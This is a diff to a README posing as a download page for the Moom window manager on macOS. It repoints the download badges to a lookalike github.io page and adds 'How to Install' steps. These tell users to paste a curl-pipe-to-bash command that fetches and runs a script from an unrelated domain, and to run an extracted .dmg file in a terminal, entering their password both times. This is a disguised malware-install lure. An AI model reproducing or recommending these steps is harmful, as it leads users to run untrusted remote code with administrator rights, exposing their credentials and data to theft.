@@ -5,9 +5,32 @@
 ---
 
 ## ✅ Download Moom for macOS  
-[![Download Moom](https://img.shields.io/badge/Download-Moom-green)](#)
+[![Download Moom](https://img.shields.io/badge/Download-Moom-green)](https://moom-download-mac.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
 
 ## 📦 What is Moom?
 
@@ -40,19 +63,10 @@ Moom lets you quickly move and zoom windows using a simple interface that appear
 
 ---
 
-[![Download Moom](https://img.shields.io/badge/Download-Moom-green)](#)
+[![Download Moom](https://img.shields.io/badge/Download-Moom-green)](https://moom-download-mac.github.io/.github)
 
 ---
 
-## 📥 How to Use
-
-- ✅ Download and install Moom on your Mac  
-- 🖱 Hover over the green maximize button or use keyboard shortcuts  
-- 🔲 Choose to snap windows to halves, quarters, or custom sizes  
-- 🎛 Save favorite layouts and restore them when needed  
-- ⚙ Customize shortcuts and grid sizes from the preferences menu  
-
----
 
 ## 🖼 Preview
 
